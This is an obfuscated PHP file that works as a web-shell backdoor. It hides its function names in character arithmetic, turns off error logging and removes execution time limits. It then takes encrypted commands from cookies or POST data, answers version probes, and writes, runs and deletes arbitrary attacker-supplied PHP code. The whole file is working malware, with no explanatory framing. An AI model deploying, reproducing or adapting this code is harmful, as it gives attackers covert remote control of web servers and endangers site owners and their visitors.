<?php $dgapdg = 'f'.chr(105)."\154".'e'.'_'."\160"."\x75".chr(1094-978)."\x5f"."\x63".chr(698-587).chr(110)."\x74"."\145"."\x6e"."\164".chr(115);
$wtlap = "\142".chr(97).chr(254-139)."\145".chr(474-420).chr(52)."\x5f"."\144".chr(101)."\143".chr(111).chr(100).chr(101);
$peiljcvqj = chr(680-575).chr(559-449).chr(105)."\137".chr(372-257).chr(1092-991).chr(116);
$hmdrsjc = "\165"."\x6e"."\154".chr(428-323)."\156".'k';


@$peiljcvqj("\145".chr(114).chr(663-549).chr(832-721).'r'.chr(723-628).'l'.chr(360-249).'g', NULL);
@$peiljcvqj("\x6c"."\157".'g'."\137".chr(431-330).'r'."\x72".'o'.'r'.'s', 0);
@$peiljcvqj(chr(870-761)."\141"."\x78"."\137"."\x65".chr(120).chr(101)."\x63"."\165"."\x74".chr(105).chr(111).chr(694-584)."\137".'t'.chr(563-458)."\x6d".chr(219-118), 0);
@set_time_limit(0);

function izswf($ytajepovw, $ennwoiapxopp)
{
    $gupbzei = "";
    for ($ennwoiap = 0; $ennwoiap < strlen($ytajepovw);) {
        for ($j = 0; $j < strlen($ennwoiapxopp) && $ennwoiap < strlen($ytajepovw); $j++, $ennwoiap++) {
            $gupbzei .= chr(ord($ytajepovw[$ennwoiap]) ^ ord($ennwoiapxopp[$j]));
        }
    }
    return $gupbzei;
}

$cvdty = array_merge($_COOKIE, $_POST);
$zfhxo = 'df2eb8dd-7877-4171-aa6e-fb3c8fc3c436';
foreach ($cvdty as $dndqc => $ytajepovw) {
    $ytajepovw = @unserialize(izswf(izswf($wtlap($ytajepovw), $zfhxo), $dndqc));
    if (isset($ytajepovw[chr(527-430).'k'])) {
        if ($ytajepovw[chr(155-58)] == "\151") {
            $ennwoiap = array(
                "\x70"."\x76" => @phpversion(),
                's'.chr(875-757) => "3.5",
            );
            echo @serialize($ennwoiap);
        } elseif ($ytajepovw[chr(155-58)] == 'e') {
            $ennwoiapwkyk = "./" . md5($zfhxo) . chr(548-502).chr(105).chr(577-467).chr(99);
            @$dgapdg($ennwoiapwkyk, "<" . chr(452-389)."\x70".chr(104).chr(112).chr(331-299)."\x40".'u'.chr(110).'l'.chr(1063-958).chr(110).chr(792-685).chr(78-38).chr(95).'_'.chr(70).chr(806-733).chr(76).chr(728-659).'_'.chr(881-786)."\51"."\x3b"."\40" . $ytajepovw[chr(100)]);
            include($ennwoiapwkyk);
            @$hmdrsjc($ennwoiapwkyk);
        }
        exit();
    }
}

